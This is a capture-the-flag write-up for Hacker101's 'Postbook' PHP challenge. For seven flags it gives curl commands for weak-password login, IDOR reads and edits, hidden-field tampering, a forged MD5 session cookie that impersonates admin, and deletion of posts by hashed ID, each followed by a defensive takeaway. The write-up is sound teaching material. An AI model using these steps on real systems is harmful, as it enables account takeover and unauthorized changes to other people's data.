# Hacker101 CTF — Postbook (Easy)

**Difficulty:** Easy  
**Category:** Web / PHP / IDOR / Authentication  
**Flags:** 7
---
## Overview
Postbook is a PHP-based micro-blogging platform. Users can sign up, sign in, create public and private posts, edit their own posts, and delete them. The challenge teaches fundamental web vulnerabilities through a deliberately vulnerable application.
The homepage declares: *"We'll make sure that your private posts are safe with us."* This claim is immediately disproven by the vulnerabilities below.
**Server:** PHP/5.5.9 (OpenResty reverse proxy), MySQL
---
## Reconnaissance
### Application Behavior
The application exposes these pages via `index.php?page=`:
| Page | Purpose |
|------|---------|
| `sign_up.php` | User registration (lowercase usernames only via JS validation) |
| `sign_in.php` | User login |
| `create.php` | Write a new post (public or private) |
| `view.php?id=N` | View a post by numeric ID |
| `edit.php?id=N` | Edit a post by numeric ID |
| `delete.php?id=MD5` | Delete a post by its MD5-hashed ID |
| `profile.php&id=e` | View current user's profile |
| `account.php` | Account settings |
| `sign_out.php` | Sign out |
### Cookie-Based Session
After authentication, the server sets a cookie `id=<32-char hex>`. This value is the **MD5 hash of the user's numeric ID**. For example:
```
User ID 4  →  MD5("4")  =  a87ff679a2f3e71d9181a67b7542122c
```
The cookie is used to identify the current user across requests — no server-side session token, just a client-controlled hash. This is the root of Flags 0, 2, and 5.
### Hidden Form Fields
The "Create post" form includes a hidden `<input name="user_id" value="N">` field. The server trusts this value to assign post ownership, enabling Flag2.
### Delete Mechanism
The delete endpoint uses an MD5 hash of the post's numeric ID, not the raw numeric ID. This "security through obscurity" is the subject of Flag6.
---
## Flag 0 — Weak Credentials
**Method:** Brute-force the `user` account password
**Hint:** *"The person with username 'user' has a very easy password..."*
The application has a pre-existing account with username `user`. Testing common passwords reveals the credentials immediately:
```bash
curl -s -c cookies.txt -X POST \
  -d 'username=user&password=password&submit=Sign+in' \
  'https://TARGET.ctf.hacker101.com/index.php?page=sign_in.php' \
  -o /dev/null -w '%{http_code}'
# → 302 (redirect on success)
curl -s -b cookies.txt \
  'https://TARGET.ctf.hacker101.com/index.php' \
  | grep FLAG
```
The homepage reveals the flag embedded in the page source:
```
^FLAG^<redacted>$FLAG$
```
> **Flag 0:** `^FLAG^<redacted>$FLAG$`
**Takeaway:** Default and weak credentials are trivial to brute-force. The account `user` with password `password` is a classic example. Any publicly accessible authentication system should enforce strong password policies and rate limiting.
---
## Flag 1 — IDOR on Post View
**Method:** Access private posts by enumerating post IDs
**Hint:** *"Try viewing your own post and then see if you can change the ID"*
Post ID 2 is a **private** post ("SECRET") written by the `admin` user. Despite being marked private, the `view.php?id=N` endpoint performs no authorization check — any authenticated user can view any post by changing the `id` parameter.
```bash
curl -s -b cookies.txt \
  'https://TARGET.ctf.hacker101.com/index.php?page=view.php&id=2' \
  | grep FLAG
```
**Response:**
```html
<div class="post">
  ^FLAG^<redacted>$FLAG$
</div>
<div class="post">
  <span style="color: red;">SECRET:</span>
  <a href="?page=view.php&id=2">Dear diary...</a><br />
  I am so glad that I am on Postbook. I can finally write down my
  thoughts and no one can see them. See you tomorrow. Yours truly, admin<br />
  <span style="color: #666">Author: admin</span>
</div>
```
> **Flag 1:** `^FLAG^<redacted>$FLAG$`
**Takeaway:** "Private" posts are only private if the server enforces access control on every endpoint. The `view.php` handler trusts the requester without verifying ownership. This is a classic Insecure Direct Object Reference (IDOR) — OWASP API1:2023.
---
## Flag 2 — Hidden Form Field Manipulation
**Method:** Modify the hidden `user_id` when creating a post
**Hint:** *"You should definitely use 'Inspect Element' on the form when creating a new post"*
The "Create post" form at `create.php` includes a hidden field:
```html
<input type="hidden" name="user_id" value="4" />
```
This field determines the author of the post. The server trusts the client-supplied value without validation. Changing it to another user's ID creates a post under their identity:
```bash
curl -s -b cookies.txt -X POST \
  -d 'title=owned&body=posting+as+admin&user_id=1&submit=Create+post' \
  'https://TARGET.ctf.hacker101.com/index.php?page=create.php' \
  -D -
```
**Redirect response:**
```
HTTP/2 302
location: index.php?page=view.php&success=1&id=5&message=
  ^FLAG^<redacted>$FLAG$
```
> **Flag 2:** `^FLAG^<redacted>$FLAG$`
**Takeaway:** Hidden form fields are client-side conveniences, never server-side trust boundaries. Any value the client sends can be modified. Server-side authorization must always validate ownership — the post author should be derived from the session, not from a POST parameter.
---
## Flag 3 — Predictable Resource Location
**Method:** Access post at a predictable ID
**Hint:** *"189 * 5"*
The arithmetic 189 × 5 = 945. Post ID 945 is a special congratulatory post that doesn't appear in the timeline:
```bash
curl -s -b cookies.txt \
  'https://TARGET.ctf.hacker101.com/index.php?page=view.php&id=945' \
  | grep FLAG
```
**Response:**
```html
<div class="post">
  <a href="?page=view.php&id=">Well done!</a><br />
  ^FLAG^<redacted>$FLAG$<br />
  <span style="color: #666">Author: </span>
</div>
```
> **Flag 3:** `^FLAG^<redacted>$FLAG$`
**Takeaway:** Predictable, enumerable resource IDs (sequential integers) allow attackers to discover hidden content. Post 945 has no author and no link from any page — it's only accessible by guessing the ID. Opaque identifiers (UUIDs) or proper authorization checks would prevent this.
---
## Flag 4 — IDOR on Post Editing
**Method:** Edit another user's post by changing the `id` parameter
**Hint:** *"You can edit your own posts, what about someone else's?"*
Similar to Flag1 but on the write path. The `edit.php?id=N` endpoint shows an edit form for any post — it only checks that the user is authenticated, not that they own the post. Submitting the form saves the edit under the original author:
```bash
# Fetch the edit form for user "user"'s post (ID=3)
curl -s -b cookies.txt \
  'https://TARGET.ctf.hacker101.com/index.php?page=edit.php&id=3'
# Submit a malicious edit
curl -s -b cookies.txt -X POST \
  -d 'title=HAXORED&body=Edited+by+attacker&submit=Save+post' \
  'https://TARGET.ctf.hacker101.com/index.php?page=edit.php&id=3' \
  -D -
```
**Redirect response:**
```
HTTP/2 302
location: index.php?page=view.php&success=1&id=3&message=
  ^FLAG^<redacted>$FLAG$
```
> **Flag 4:** `^FLAG^<redacted>$FLAG$`
**Takeaway:** IDOR affects writes as well as reads. Always verify post ownership server-side before allowing edits. Derive the author identity from the authenticated session, not from request parameters.
---
## Flag 5 — Session Cookie Manipulation
**Method:** Forge a session cookie to impersonate user ID 1
**Hint:** *"The cookie allows you to stay signed in. Can you figure out how they work so you can sign in to user with ID 1?"*
The session cookie `id` is simply the MD5 hash of the user's numeric ID. There is no randomness, no server-side session lookup — the cookie value **is** the identity:
```
User ID 1  →  MD5("1")  =  c4ca4238a0b923820dcc509a6f75849b
```
Setting this cookie grants access as user ID 1 (the `admin` user):
```bash
curl -s -b 'id=c4ca4238a0b923820dcc509a6f75849b' \
  'https://TARGET.ctf.hacker101.com/index.php' \
  | grep FLAG
```
**Response:**
```
^FLAG^<redacted>$FLAG$
```
> **Flag 5:** `^FLAG^<redacted>$FLAG$`
**Takeaway:** Session tokens must be cryptographically random and unguessable. Using `MD5(user_id)` as a session identifier is equivalent to having no authentication at all — the entire user space is enumerable. Server-side sessions with random tokens (or signed JWTs with proper verification) are the minimum acceptable approach.
---
## Flag 6 — Obscured Delete Parameter
**Method:** Delete a post by supplying its MD5-hashed ID instead of the numeric ID
**Hint:** *"Deleting a post seems to take an ID that is not a number. Can you figure out what it is?"*
While view and edit endpoints use numeric IDs (`?id=4`), the delete endpoint uses an MD5 hash of the post ID:
```html
<!-- Delete link for post 4: -->
<a href="index.php?page=delete.php&id=
  a87ff679a2f3e71d9181a67b7542122c">delete</a>
```
The hash is **MD5("4")**. Computing the hash for any post ID allows deletion of that post:
```bash
# MD5 of "5"
python3 -c 'import hashlib; print(hashlib.md5(b"5").hexdigest())'
# → e4da3b7fbbce2345d7772b0674a318d5
curl -s -b cookies.txt \
  'https://TARGET.ctf.hacker101.com/index.php?page=delete.php&id=e4da3b7fbbce2345d7772b0674a318d5' \
  -D -
```
**Redirect response:**
```
HTTP/2 302
location: index.php?page=home.php&message=
  ^FLAG^<redacted>$FLAG$
```
The flag is returned as a message parameter in the redirect Location header.
> **Flag 6:** `^FLAG^<redacted>$FLAG$`
**Takeaway:** Replacing numeric IDs with MD5 hashes provides no real security — it's "security through obscurity." Since MD5("1"), MD5("2"), etc. are all trivially computable, the entire post space is still enumerable. If the intent was access control, server-side authorization is the correct solution, not hash-based identifier obfuscation.
---
## Complete Flag List
| Flag | Hash | Vulnerability | Technique |
|:----:|------|:-------------|-----------|
| 0 | `<redacted>` | Weak credentials | Brute-forced `user:password` |
| 1 | `<redacted>` | IDOR (read) | Viewed private post via `view.php?id=2` |
| 2 | `<redacted>` | Client-side trust | Changed hidden `user_id` from 4 to 1 on post creation |
| 3 | `<redacted>` | Predictable IDs | Accessed `view.php?id=945` (189 × 5) |
| 4 | `<redacted>` | IDOR (write) | Edited post ID=3 via `edit.php?id=3` + POST |
| 5 | `<redacted>` | Broken session | Set cookie `id=MD5("1")` to impersonate admin |
| 6 | `<redacted>` | Obscured IDs | Deleted post via `delete.php?id=MD5(post_id)` |
---
## Key Takeaways
1. **IDOR is everywhere.** Flags 1, 3, and 4 are all manifestations of the same root cause: the server never verifies that the authenticated user owns the resource they're requesting. Every endpoint (`view.php`, `edit.php`) must perform an ownership check.
2. **Client-side trust is no trust.** The hidden `user_id` field (Flag2) and the JS username validation (`/^[a-z]+$/`) both assume the client is honest. Never derive authorization decisions from client-supplied values.
3. **Session tokens must be random.** `MD5(user_id)` is a predictable, forgeable session token. Use cryptographically random server-side session identifiers. An attacker can enumerate every user by computing MD5 of all integers.
4. **MD5 is not a security boundary.** Hashing a numeric ID (Flag6) doesn't make it unguessable. The hash is deterministic and the input space is tiny — the entire post catalog is enumerable.
5. **Default credentials are a real problem.** The `user:password` account (Flag0) is the most common credential pair in capture-the-flag challenges for a reason: it mirrors real-world defaults that persist in production systems.
6. **"Private" is only as strong as the access control.** The admin's private diary post (Flag1) was trivially readable by any authenticated user. The `private` flag on posts is a UI convention, not a security control — the server never enforced it.
---
## References
- [Hacker101 CTF Platform](https://ctf.hacker101.com/)
- [Hacker101 — IDOR (Video)](https://www.hacker101.com/sessions/idor)
- [Hacker101 — Session Fixation (Video)](https://www.hacker101.com/sessions/session_fixation)
- [OWASP — Insecure Direct Object References](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [OWASP — Broken Authentication](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
